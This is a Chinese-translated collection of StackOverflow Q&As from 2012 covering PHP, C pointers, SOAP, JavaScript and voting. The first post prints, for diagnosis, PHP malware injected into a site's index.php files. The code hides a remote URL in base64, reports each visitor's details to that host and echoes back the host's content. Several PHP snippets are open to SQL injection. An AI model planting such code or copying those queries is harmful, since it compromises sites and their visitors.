# StackOverflow 问答 13599000-13599999

# database - index.php 被黑

> ID：13599004
> 
> 赞同：1
> 
> 时间：2012-11-28T06:20:07.200
> 
> 标签：database, security, web, xss, rows

*刚刚注意到代码被注入到网站目录中的每个 index.php 文件以及同一服务器上其他网站目录中的每个 index.php 文件中！

嗨，我一直在观察我的一个网站上发生的一件奇怪的事情；数据库表中的行神秘地消失了。不是立即，而是在一天的过程中，比如每 30 分钟左右一排。无论如何，我一直在努力找出造成这种情况的原因，但我无法查明消失行的来源。所以我开始怀疑也许其他人正在使用机器人或邪恶的东西来做这件事，尽管对 MySQL 数据的影响并没有造成毁灭性的影响（我认为一个黑客会想要搞砸整个数据库，如果他/她有一个机会......不仅仅是每 30 分钟删除一行）。

所以当我在我的服务器上打开索引文件时，我发现了一段我没有编写的代码块，并且无法理解......表明其他人能够修改服务器上的 index.php 文件。注入的php代码块附在下面：

```
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
// This code use for global bot statistic
$sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
$stCurlHandle = NULL;
$stCurlLink = "";
if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
{
    if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
    $stCurlLink = base64_decode( 'aHR0cDovL2Jyb3dzZXJnbG9iYWxzdGF0LmNvbS9zdGF0RC9zdGF0LnBocA==').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
        @$stCurlHandle = curl_init( $stCurlLink ); 
}
} 
if ( $stCurlHandle !== NULL )
{
curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 6);
$sResult = @curl_exec($stCurlHandle); 
if ($sResult[0]=="O") 
 {$sResult[0]=" ";
  echo $sResult; // Statistic code end
  }
curl_close($stCurlHandle); 
}
} 
```

我用 HostGator 主持。这段代码能否对数据库中消失的行负责？有人知道这个注入的代码有什么作用或它可以对我的网站做什么吗？这是 XSS 还是其他类型的 hack？我怎样才能防止这种事情发生？任何建议表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-27T10:55:16.127

不，这只是一个简单的 ftp 密码窃取。也许您使用 Windows 和 Total Commander 上传您的内容，并存储帐户密码。Windows 工作站上的病毒（？）合法地连接到 FTP 服务器，并将代码附加到每个目录的 index.php 中。清理您的工作站并更改 FTP 密码！

# php - 从mysql中的表中获取最大值

> ID：13599006
> 
> 赞同：1
> 
> 时间：2012-11-28T06:20:20.523
> 
> 标签：php, mysql, sql

我想从按party_id 分组的表中获取或获取最大日期。

为此，我尝试了：

```
$check = mysql_fetch_array(mysql_query("select max(fixed_date) as f from case_proceeding group by party_id where party_id='$row[party_id]'")); 
```

之后，我想像这样打印最大日期：

```
echo $check['f']; 
```

但它不起作用。我认为 mysql_query 有错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:21:52.110

尝试，`GROUP BY`（*应该在`WHERE`子句*之后）在这里不需要，因为你已经从`WHERE`

```
$check = mysql_fetch_array(mysql_query("select max(fixed_date) as f from case_proceeding where party_id='$row[$party_id]'")); 
```

但是您的查询很容易受到攻击`SQL Injection`，请阅读下面的文章以防止它

*   [如何防止 PHP 中的 SQL 注入？](https://stackoverflow.com/questions/60174/best-way-to-prevent-sql-injection)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T06:22:00.220

试试这个：

此处不需要 GROUP BY 子句

```
select max(fixed_date) as f 
from   case_proceeding 
where  party_id='$row[party_id] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T06:22:42.780

试试这个 ：：

```
select max(DATE(fixed_date)) as f from case_proceeding where party_id=? group by party_id 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-28T06:23:03.657

尝试

```
$check = mysql_fetch_array(mysql_query("select max(fixed_date) as f from case_proceeding where party_id='$row[party_id]' ")); 
```

**注意**：mysql_* 函数已弃用，因此请尝试 pdo 或 mysqli

# c - 将指针发送到函数，而指针是指针数组的一部分

> ID：13599007
> 
> 赞同：1
> 
> 时间：2012-11-28T06:20:32.343
> 
> 标签：c

我正在尝试发送一个指向函数的指针，但该指针是指针数组的一部分

```
void func(A **pa)
{
     return;
}

A *pa;
pa=(A*)malloc(2*sizeof(A)); 
```

所以，数组中的第一项`pa[0]`很容易发送（因为它是指针指向的地方）

```
func(&pa); 
```

但是现在我卡住了，我该如何发送第二个项目？`pa[1]`

我尝试了类似的东西，`func(&pa + 1*sizeof(A));` 但似乎没有用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T06:23:14.277

您正在寻找`&pa[1]`：

```
func (&pa[1]);   // call function with second element of pointer array 
```

* * *

顺便说一句，我不知道你是否要分配一个只有两个指针的数组，但如果你是，malloc 是错误的。它应该是

```
pa = malloc (2 * sizeof(A*));  // note the addition of * after "A" 
```

您正在做的是分配两倍大小的 a `A`，可以想象它可能有数千个字节长。指向此类对象的指针不需要那么多空间。

此外，在 中`C`，不需要也不应该强制转换 的返回类型`malloc()`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T06:36:53.817

如果你想传递一个指向 A 数组的指针，你应该这样做：

```
func(&pa[0]); 
func(&pa[1]); 
```

但是如果它是一个数组，你不应该只传递一个指向数组本身的指针和数组的大小吗？这基本上意味着只有第一行。

如果您想将指针传递给指针数组，您应该完全不同：

```
A **pa;
pa=(A**)malloc(2*sizeof(A*)); 
```

但是您还必须对每个 A 进行 malloc 并相应地更改 Func 。

另请注意，`func(&pa + 1*sizeof(A))`由于指针数学，这不起作用：您只需要这样做`func(&pa + 1)`，编译器会处理其余的事情以获取数组中的第二个成员。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-28T09:15:06.117

注意：此答案已更新，以反映四个小时前 OP（原始海报）@hudac 的澄清。提出的问题既有效又非常有趣。话虽如此，可能有一些方法可以简化 OP 的代码，我会在提供原始问题的答案后查看这些方法。

首先，根据 OP 最近的澄清，我将通过给出 A 和 func 的示例定义，尝试使问题的代码更加具体：

```
typedef struct { int x; int y;} A;

void func(A **ppa)
{
   printf("(%d,%d)\n",(*pa)->x,(*pa)->y);
} 
```

然后，我将给出一些代码，为问题和答案提供适当的上下文：

```
void main() {
    A *pa;  
    pa = (A*) malloc(2 * sizeof(A));

    pa[0].x = 3;    pa[0].y = 4;
    pa[1].x = 13;    pa[1].y = 42;

    func(&pa);      
    //the answer to the question goes here
} 
```

目前的问题要求一种方法将指针传递给指向动态分配的 A's 数组的*第二个*`pa`元素的指针。OP 尝试过，成功地传递了指向`pa`( `func(&pa);`) 的第一个元素的指针的指针，尝试使用指针算法传递指向第二个元素的指针的指针，这当然没有按预期工作。鉴于 OP 的代码，给出的答案都没有接近正确！事实证明这是一个非常有趣的问题，因为有`func`期望 A ** 而不是 A * 会使事情变得比它们必须的复杂得多。在不了解 OP 遇到的问题的情况下，可以使事情变得更简单，但这无法深入了解为什么要正确地获得该指针算术如此困难（实际上是不可能的）。

重温基础知识的一个小弯路：如果你有一个赋值，你有一个左值（左侧表达式）和一个右值（右侧表达式）；左值是有地址的东西，右值有一个值，赋值存储在左值的地址中。一个例子：x = 5; 一个表达式可能有一个左值和一个右值（例如 x），或者它可能只有一个右值（例如 5）。运算符 & 仅适用于左值，即具有内存地址的事物，即诸如 x 之类的事物，但不适用于诸如 5 之类的事物。

回到问题：pa 是 A * 类型，而 func 需要 A ** 类型的参数。OP 在弄清楚如何调用 func 以便它可以与 pa 的第一个元素一起使用时没有问题：

```
func(&pa); 
```

请注意，我很难忍受将这段代码连同注释说这是对处理 pa 的第一个元素的 func 的调用。函数 func 需要在 pa[0] (aka * pa) 上操作，即 A 类型的东西，但是由于 func 的定义方式，我们传递了 A ** 类型的 &pa ！！！稍后我将通过使用更合适的参数类型定义函数来解决这个问题。现在，我将尝试使用我所拥有的。

OP 和其他人发现很难调用 func 来处理 pa 的第二个元素的原因是，*所需要的是一个指针表达式，其值包含一个内存的地址，该内存的地址是pa 的第二个元素*。没有这样的指针表达式，因为 pa 的第二个元素的地址没有*存储*在任何地方。（抱歉，如果大写字母伤害了您的眼睛 :-) 我需要尽可能清楚地说明这一点！）通过指针算术访问 pa 的第二个元素，使用第一个元素的地址（这是 pa 持有的） .

这并不意味着不可能回答这个问题。这只是意味着答案将出乎意料并且令人讨厌。因此，假设问题不允许我们在 main() 中引入另一个变量，我们只需更改 pa 以便调用 func，然后将其更改回来以便能够使用 pa 而不会出现令人讨厌的意外稍后在 main() 中。

```
pa++; func(&pa); pa--; 
```

*这*是对OP问题的答案。当前在此处发布的其他答案试图回答不同且更简单的问题。但是最初的问题要有趣得多，现在它有了答案:-) 但我觉得比答案更有趣的是我强调使用大写字母的观察。

为了恢复理智，我们需要重新审视 func 定义中所做的选择。

如果我们只想访问存储在数组中的 A，我们可以考虑完全消除对指针的依赖。

```
typedef struct { int x; int y;} A;
void bar(A a)
{
   printf("(%d,%d)\n", a.x, a.y);
}
void main() {
    A *pa;  
    pa = (A*) malloc(2 * sizeof(A));

    pa[0].x = 3;    pa[0].y = 4;
    pa[1].x = 13;    pa[1].y = 42;

    bar(pa[0]);      
    bar(pa[1]);
} 
```

我们可能要考虑让函数采用 A * 参数而不是普通 A 的原因有两个：1\. 如果函数需要修改指向的 A 和/或 2\. 如果 A 恰好是一个大结构并且我们不希望每次调用我们的函数都会导致将一大块内存复制到堆栈中。

```
typedef struct { int x; int y;} A;
void foo(A *a)
{
   int tmp = a->x;
   a->x = a->y;
   a->y = tmp;
}
void bar(A a)
{
   printf("(%d,%d)\n", a.x, a.y);
}
void main() {
    A *pa;  
    pa = (A*) malloc(2 * sizeof(A));

    pa[0].x = 3;    pa[0].y = 4;
    pa[1].x = 13;    pa[1].y = 42;

    foo(&pa[0]); //or alternatively: foo(pa);
    bar(pa[0]);  //or alternatively: bar(*pa);

    foo(&pa[1]); //or alternatively: foo(pa + 1);
    bar(pa[1]);  //or alternatively: bar(*(pa+1));
} 
```

可能对 OP 有所帮助的另一个注意事项是，在执行指针算术时，指针的类型起着重要作用。所以 pa + 1 的数值等于 pa 的数值加上 sizeof(A)。（这与尝试使 func 与 pa 的第二个元素一起使用以下调用失败有关：func(&pa + 1*sizeof(A))）

对 OP 的最后说明：如果您不想更改 func 的签名，因为您计划在 func 中获取一个 A** 指针并用它做一些有趣的事情，例如为其分配另一个指针（例如指向一个新的 malloc( )-分配的内存块)，你会走进一个雷区！请检查我对另一个问题的回答，我相信您会发现相关问题：[为什么 line2 中的 free 使 memcpy 什么也不做？malloc 之前是免费的吗？](https://stackoverflow.com/questions/13585173/why-the-free-in-line2-makes-memcpy-do-nothing-is-free-before-malloc-is-o-k/13585357#13585357) 这个故事的寓意是指针很有用，但概念复杂性和错误的可能性随着每个 * 呈指数增长（并且通常有更好的选择）:-)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-28T06:23:56.253

尝试这个 ：

```
func(&pa[0]); // for 1st object 
func(&pa[1]);// for 2nd object 
```

`pa`将为您提供 A 数组的地址。 `&pa`将为您提供整个数组的地址。

方法，

```
A * ptr;

ptr = pa ;// increment `ptr` will give you next element in same array
ptr = &pa ;// increment `ptr` will give you the next array of that type 
```

还将函数`func`签名更改为

```
void func(A *pa)
{
     return;
} 
```

==================================================== ==========

如果要将指针数组传递给`func`

这样做：

```
A **pa = malloc(2*sizeof(A*)); 
```

然后像这样发送

```
func(&pa[0]);
func(&pa[1]); 
```

并且`func`将是

```
void func(A **pa)
{
     return;
} 
```

# android - 是否可以从android调用WSHTTPBINDING？

> ID：13599013
> 
> 赞同：2
> 
> 时间：2012-11-28T06:21:36.867
> 
> 标签：android, .net, web-services, wcf-wshttpbinding, soap1.2

```
private static final String SOAP_ACTION = "http://tempuri.org/IService1/HelloTest";
private static final String METHOD_NAME = "HelloTest";
private static final String NAMESPACE = "http://tempuri.org/";
private static final String URL = "";  //blank for privacy
 SoapObject request = new SoapObject(NAMESPACE, METHOD_NAME);
              //request.addProperty("Celsius", "32");    
                SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
                envelope.dotNet=true;
                envelope.setOutputSoapObject(request);
                HttpTransportSE ht = new HttpTransportSE(URL);                  
         try {
                ht.call(SOAP_ACTION, envelope);  
                final  SoapPrimitive response = (SoapPrimitive)envelope.getResponse();
                final String str = response.toString();
                Toast.makeText(MainActivity.this, str, 5000).show();
                fetch_service.setText(str);     
             }
         catch (Exception e) {
                   e.printStackTrace();  
             } 
```

我想调用我的方法（Hello Test）。结果将是 hello 测试返回。但是这个示例适用于基本的 http 绑定，但不适用于 wshttpbinding。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-08-03T06:06:42.893

```
 Element e = new Element();
        e.setName("To");
        e.setNamespace("http://www.w3.org/2005/08/addressing");
        e.addChild(Node.TEXT,
                "your URL HERE");

        Element e1 = new Element();
        e1.setName("Action");
        e1.setNamespace("http://www.w3.org/2005/08/addressing");
        e1.addChild(Node.TEXT,
                "http://tempuri.org/IService1/HelloTest");

    request.addProperty("Celsius", "32");    

    // use VER12 instead of VER11
    SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER12);

    envelope.dotNet=true;

    // add HederOut to envelope
    envelope.headerOut = new Element[] { e, e1 };

    envelope.setOutputSoapObject(request); 
```

# javascript - JavaScript Function 将检查网页上的特殊链接，如果没有找到它们，则会发出警报

> ID：13599018
> 
> 赞同：0
> 
> 时间：2012-11-28T06:21:52.250
> 
> 标签：javascript, html, web

javascript 函数必须搜索 html 网页中的特殊链接（版权网址）。如果它没有找到特殊的 url，则必须发出警报。“Div ID 检查”和“Div 长度检查”是不错的方法，但是可以直接控制链接（url）吗？

我已经知道这并不能保护链接。

**JavaScript 文件示例：**

```
if () {
//If function find the copyright links, then null - don't make anything:

}
else {
//If function doesn't find copyright links, then give an alert:
alert("Please protect original copyright links.");
} 
```

**html页面示例：**

```
<html>
<head>
<script type='text/javascript' src='http:// ... file.js'></script>
</head>

<body>

  <!-- Start Copyrigt Area -->
  <div id="footer">
    <a href="http://example1.com">example1.com</a>
    <a href="http://example2.com">example2.com</a>
  </div>
  <!-- End Copyrigt Area -->

</body>
</html> 
```

至于我为什么这样做，以下是我的理由：

我为特殊的博客社区网站制作了一些主题。有时，我们的主题用户会删除或更改页脚区域中的版权链接。博客社区网站不支持任何动态内容，如php，我们只能在一个页面中使用html和一些特殊的内容标签。另一方面，该站点不允许JS托管等。因此，由第三方托管服务提供商提供的JS文件。

我不想加密代码。所以我认为我们使用 JavaScript 函数检查链接。如果我们的链接被删除或更改，则用户必须收到警报。

也许，一些主题用户发现这些 javascript 函数并将它们删除并重新托管代码。但我想他们中的大多数人会什么都做不了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:29:09.060

```
var allLinks = document.links;
for (var i=0; i<allLinks.length; i++) {
  if(allLinks[i].text=="&copy;"){
     //do something
  }
  else {
    //If function doesn't find copyright links, then give an alert:
    alert("Please protect original copyright links.");
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T06:30:51.460

**您可以通过getElementsByTagName**获取所有文档链接：

```
var a = document.getElementsByTagName('a');
var noLinks = true;
for (var i=0, len=a.length; i<len; ++i) {
    var href = a[i].getAttribute('href');       
    if (href == "copylink1" || href == "copylink2") {
        noLinks = false;
        break;
    }
}

if (noLinks) {    
    alert('...')
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T06:38:31.133

根据您的描述，我认为您应该同时检查链接和文本。假设您正在使用 JQuery：

```
​$().ready(function(){
    var copyrightLinks = $("a[href='your copyright url']");
    //check link and inner text
    if(copyrightLinks .length > 0 && copyrightLinks.text().indexOf("your copyright text")>=0){
        console.debug("has copy right");
    }else{
        alert("Please protect original copyright links.");
    }
});​ 
```

# javascript - 动态缩略图 HTML？

> ID：13599019
> 
> 赞同：-2
> 
> 时间：2012-11-28T06:21:55.667
> 
> 标签：javascript, html, css

所以我正在为一个朋友做一些 PSD 到 HTML，但我远非擅长它。我正在尝试对下面的图像进行编码。当点击不同的图标时，你会得到不同的时间线。我不擅长 Javascript，所以只是想知道这在 HTML/CSS 中是否可行，如果可以，怎么办？有什么基本的例子吗？教程？（我不确定我应该寻找什么，所以我的研究并不容易）

![时间线](../Images/762b3edc468424822a602840489325b7.png)

非常感谢任何帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:27:02.443

我不确定您是否可以使用 HTML 和 CSS，但使用 Javascript 很容易。在这里您可以找到教程和示例：[Jquery Tabs](http://jqueryui.com/tabs/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T06:27:55.897

前几天我看到了这个[http://thecodeplayer.com/walkthrough/css3-image-slider-with-stylized-thumbnails](http://thecodeplayer.com/walkthrough/css3-image-slider-with-stylized-thumbnails)这可能是单选按钮的初衷，但它是一个简单的无 javascript 解决方案，值得一试:)

基本上这个想法是你玩单选按钮的选定状态，在加载时隐藏元素并使用'：checked'伪选择器来显示它们，因为一次只能选择单选组中的一个元素，这个完成工作。

同样，这是控件的初衷，但它确实是一个很酷的 hack :)

# c++ - 在运行时向窗口添加控件

> ID：13599027
> 
> 赞同：0
> 
> 时间：2012-11-28T06:22:21.737
> 
> 标签：c++, windows, forms

我在这个项目中使用 C++（没有 MFC 或 .NET 或任何类似的库）。是否可以使用 VC++ 2010 Professional 向使用 CreateWindow 创建的窗口添加控件？我只能在使用 Windows 窗体项目时看到如何执行此操作，但我的是常规 Win32 应用程序（WinMain 入口点）。我要添加的是一个对话框，其中包含可单击项目的列表（我不知道我会为此使用哪种控件）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:30:50.087

您可以使用 CreateWinodw 或 DialogBox 来创建窗口（Dialog），当 msg WM_INITWINDOW 或 WM_INITDIALOG 时，使用 CreateWindow 在窗口上创建控件。

例如 CreateWindow("BUTTON",... 您可以在运行时向窗口添加一个按钮。更多类名查找 MSDN。

如果你需要一个对话框，建议使用对话框资源。 [http://msdn.microsoft.com/en-us/library/windows/desktop/aa381003(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/aa381003(v=vs.85).aspx)

# php - 登录会话 php

> ID：13599035
> 
> 赞同：2
> 
> 时间：2012-11-28T06:22:56.567
> 
> 标签：php, mysql, session, login

我创建了登录会话，它显示了一个错误：未识别`myusername`并且`mypassword`在这些行中。我不明白为什么。

```
$myusername=$_POST['myusername']; 
$mypassword=$_POST['mypassword']; 
```

这是我的 checklogin.php

```
mysql_connect("$host", "$username", "$password")or die("cannot connect"); 
mysql_select_db("$db_name")or die("cannot select DB");

$myusername=$_POST['myusername']; 
$mypassword=$_POST['mypassword']; 

$sql="SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'";
$result=mysql_query($sql);

$count=mysql_num_rows($result);

if($count==1){

session_register("myusername");
session_register("mypassword"); 
header("location:login_success.php");
}
else {
echo "Wrong Username or Password";
}
?> 
```

这是我的登录表格：

```
<form action='checklogin.php' method="post" >
Username
<input name='myusername' type="text">
Password
<input name='mypassword' type="password">

<input type="submit" name="Submit" value="Login">

</form> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-28T06:25:33.020

检查`$_POST['myusername']`并`$_POST['mypassword']`在使用前设置

```
if(isset($_POST['myusername']) && isset($_POST['mypassword']) && !empty(trim($_POST['myusername'])) && !empty(trim($_POST['mypassword']))) {

 } 
```

它在表单动作中看起来`login_true.php`也应该是`checklogin.php`

```
<form action='checklogin.php' method="post" > 
```

因为您发送的数据`login_true.php`不在，`check_login.php`所以您收到错误：unidentified bla bla

## [**警告：您的代码对sql 指令**](http://en.wikipedia.org/wiki/SQL_injection)完全开放[](http://en.wikipedia.org/wiki/SQL_injection)

 ****好读：**

1.  [**防止SQL注入的最佳方法？**](https://stackoverflow.com/questions/60174/best-way-to-prevent-sql-injection)
2.  [**MySQL 开发人员的 PDO 教程**](http://wiki.hashphp.org/PDO_Tutorial_for_MySQL_Developers)
3.  [**适合初学者的 Pdo（为什么？以及如何？）**](http://www.brightmeup.info/article.php?a_id=2)**

# primefaces - 如何在 p:dialog 中打开 url？

> ID：13599036
> 
> 赞同：0
> 
> 时间：2012-11-28T06:23:00.707
> 
> 标签：primefaces

我想要这样的东西。

```
<h:commandButton value="Submit" onclick="ex.show()"></h:commandButton>

<p:dialog id="dialog1"  widgetVar="ex">
   <h:output Text value="Hi"/>
</p:dialog> 
```

这将在 p:dialog 中打开带有 hi 文本的弹出窗口。但我需要在该弹出窗口中打开一个网址。我该如何接近？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:21:09.030

您可以放置`iframe`​​在您的对话框中

像这样 ：

```
<h:form prependId="false">
<h:commandButton value="Submit" onclick="ex.show(); return false;"></h:commandButton>

<p:dialog id="dialog1"  widgetVar="ex"  onHide="jQuery('#someId').hide();" onShow="jQuery('#someId').show();">
    <iframe frameborder="0" align="left"
         src="http://www.primefaces.org"
         name="someName" id="someId" scrolling="auto" width="750"
         height="500" marginheight="5" marginwidth="10">
     </iframe>
</p:dialog>

</h:form> 
```

第二个选项可以放置`p:lightBox iframe="true"`在您的对话框中，并在打开对话框时打开它，如下所示：

```
<h:form prependId="false">
    <h:commandButton value="Submit" onclick="ex.show(); return false;"></h:commandButton>

    <p:dialog id="dialog1"  widgetVar="ex" onShow="openLink()">
        <p:lightBox iframe="true">  
            <h:outputLink id="mylink" value="http://www.primefaces.org">  
            </h:outputLink>  
        </p:lightBox>  
    </p:dialog>
    <script>
        function openLink(){
            setTimeout("jQuery('#mylink').click();", 50);
        }
    </script>
</h:form> 
```

# google-maps - 如何找到围绕某个位置 5 英里半径的一组纬度/经度对

> ID：13599044
> 
> 赞同：2
> 
> 时间：2012-11-28T06:23:13.447
> 
> 标签：google-maps, latitude-longitude

如何找到以纬度/经度或地址表示的某个位置 5 英里半径范围内的一组纬度/经度对。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T18:43:01.337

首先，您决定要拥有多少（纬度，经度）对：
您可能希望有 4 个坐标围绕中心点形成一个正方形。
或者您决定在中心点周围放置一个常规的 N-Gon。

然后使用从纬度/经度到米的投影，例如 EquiDistantProjetion。

这使您可以将纬度/经度中心转换为笛卡尔米，然后您可以像在学校学到的那样进行计算。

现在您有了以笛卡尔米为单位的中心点：
然后您使用坐标 (r, phi) 的极坐标形式来计算正方形或 N 边形的角点。(centerX + r* sin(phi), centerY + r* cos(phi))。

最后，您必须使用逆变换将坐标对转换回纬度/经度。

EquiDistantProjection 适用于最远约 100 英里的距离。它在纬度 80 度以上不能很好地工作。（极地）

# jquery - 防止重复匿名投票

> ID：13599045
> 
> 赞同：2
> 
> 时间：2012-11-28T06:23:15.653
> 
> 标签：jquery, comments, rate, vote

如何识别评论或文章的重复投票或评分？例如，当您对评论进行投票时，您不能再对该评论进行投票。

我希望用户可以对评论进行投票，这个增量即将保存在数据库中，唯一要保存的是数据库中正票和负票的增量。所有访问者都可以对评论进行投票，每个人只能投票一次。

有客户端解决方案吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:11:27.433

基于 cookie 或 localStorage 的客户端解决方案将覆盖一个使用单个浏览器的诚实用户，这是大多数情况（所以你不妨这样做）。它根本不会做任何事情来防止任何具有恶意和任何技术知识的人的欺诈，因此您还需要在信任边界的另一侧（在服务器上）进行检查。

一个坚定的攻击者*将*能够填满投票箱，但你有一些选择来劝阻随意滥用。

正如其他人所提到的，一种简单的解决方案是允许每个 IP 地址投一票。这不是一个糟糕的主意，但请参阅此讨论以了解为什么它也不是一个好主意：[每个 IP 地址限制 1 票？](https://stackoverflow.com/questions/1246705/limit-1-vote-per-ip-address)它可以阻止合法用户投票（考虑两个室友共享个人路由器），并且不会阻止选票填充（我可以在家里投票，然后在工作中再次投票）。当您考虑像 AOL 这样经常重新分配地址（表面上可能是为了保护其用户的隐私）的 ISP 时，它变得更加复杂（至少流行的观点是，我只是假设这仍然是正确的）。

您可能需要验证码。这提供了与需要经过验证的电子邮件地址类似的保护，而您的用户负担稍轻。当然，这些方法都不是保证。任何拥有域名的人都有无数个唯一的工作电子邮件地址，如果几十张选票足以影响投票结果，那么攻击者只需要耐心进行几十次验证码测试。

更复杂的解决方案是要求用户帐户，巧妙地观察滥用迹象，并禁止涉嫌欺诈的帐户。不过，我猜这远远超出了你准备做的任何事情的范围。除非也许有人已经发布了这种东西的免费通用实现？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T06:31:50.677

用户可以在他的浏览器中禁用 JavaScript，删除 cookie 并轻松绕过您的识别。这不是最好的解决方案。除此之外，最好在服务器端添加检查用户IP地址。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T06:27:11.853

我认为 cookie 不是限制投票的好方法。您可以清除它们并再次投票。可能最好的方法是只允许注册用户投票，然后在每篇文章的某个存储位置跟踪他们。当有人尝试投票时，请检查文章的“为此投票的用户”数组，如果他们不在其中，请允许投票通过。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-28T07:53:08.283

好的。另一个不好的做法。只是试图愚弄一个匿名选民。当他第一次投票时 - 写入您的 DB +1 和一个带有当前匿名用户额外投票量的 cookie。当他再次投票时，只需将 +1 添加到 cookie 数量，而不是添加到您的数据库并更新 UI。所以，用户不知道他不能多次投票，也不要试图清除他的 cookie 或其他东西。当然，您不能将这种方法用于任何比赛，仅用于统计。在您的情况下，您不应该为注册用户设置此 cookie 并使用标准方法来检查他们的投票。

# php - 为什么 mkdir 在递归选项设置为 true 时失败？

> ID：13599046
> 
> 赞同：10
> 
> 时间：2012-11-28T06:23:28.157
> 
> 标签：php, mkdir

我运行以下代码：

```
mkdir('mnt/1',0777,true);
mkdir('mnt/a',0777); 
```

目录“a”已创建，而目录“1”未创建，页面打印警告。

```
Warning: mkdir(): File exists in /home/bitrix/www/php_test.php on line 3 
```

我对正在运行的用户 apache 的目录 mnt 拥有完全权限：

```
drwxr-xr-x 1 bitrix bitrix   4096 Nov 28 10:10 mnt 
```

PHP 版本 - PHP 5.3.3。阿帕奇版本 2.2.15。

任何想法，为什么 mkdir 在递归选项设置为 true 时失败？

**更新！** 好吧，我清除了文件夹，制作了以下 php-script 并再次运行它：

```
<?php
        error_reporting(E_ALL);
        mkdir('mnt/1',0777,true);
        mkdir('mnt/2/',0777,true);
        mkdir('./mnt/3',0777,true);
        mkdir('./mnt/4/',0777,true);

        mkdir('mnt/a',0777);
        mkdir('mnt/b/',0777);
        mkdir('./mnt/c',0777);
        mkdir('./mnt/d/',0777);
?> 
```

这是输出：

```
Warning: mkdir(): File exists in /home/bitrix/www/php_test.php on line 3 
Warning: mkdir(): File exists in /home/bitrix/www/php_test.php on line 4 
Warning: mkdir(): File exists in /home/bitrix/www/php_test.php on line 5 
Warning: mkdir(): File exists in /home/bitrix/www/php_test.php on line 6 
```

这是脚本执行后文件夹 mnt 的内容：

```
drwxr-xr-x  1 bitrix bitrix  4096 Nov 28  2012 .
drwxrwx--- 11 bitrix bitrix 12288 Nov 28 11:10 ..
drwxr-xr-x  1 bitrix bitrix     0 Nov 28  2012 a
drwxr-xr-x  1 bitrix bitrix     0 Nov 28  2012 b
drwxr-xr-x  1 bitrix bitrix     0 Nov 28  2012 c
drwxr-xr-x  1 bitrix bitrix     0 Nov 28  2012 d 
```

我还尝试了递归 mkdir 的绝对路径 - 仍然没有运气，而非递归 mkdir 无论路径如何设置都可以正常工作。递归 mkdir 有什么问题？我还是没有想法。。

**更新！**进一步调查显示，发生这种情况是因为 mnt 是一个文件夹，通过命令挂载

```
mount -t cifs -o username=***user***,password=***password***,uid=bitrix,gid=bitrix,iocharset=utf8,codepage=866 //192.168.1.6/folder /home/bitrix/www/mnt 
```

在所有其他目录中递归 mkdir 工作正常，而在该目录中只有非递归 mkdir 工作！

**更新！**正如**femtoRgon**假设的 mkdir，当从文件夹中的脚本运行时`mnt`，递归和非递归都可以正常工作。但是我仍然无法弄清楚，为什么从 /home/bitrix/www 运行时会失败？我什至尝试使用选项安装`file_mode=0775,dir_mode=0775`- 没有运气。我的操作系统 = CentOS 6.3，如果重要的话..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-29T07:14:13.930

After some googling, I found the answer on [php.net](http://www.php.net/manual/fr/function.is-dir.php#98338). It is all about `serverino` mount option. When I mounted folder with `noserverino` all problems were gone. Anyway thanks guys for trying to help!

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T14:25:02.203

您可以尝试将斜杠字符附加到您的第一个参数。

```
mkdir('./mnt/1/',0777,true); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T14:52:58.997

这是创建目录的正确方法：

```
mkdir('/test1/test2', 0777, true);

mkdir("test1/test2",0777,true); 
```

所以你的错误可能出现在一些缺失的行上。不是你创建目录的方式。

有关更多详细信息，您可以在此处查看：http: [//php.net/manual/en/function.mkdir.php](http://php.net/manual/en/function.mkdir.php)

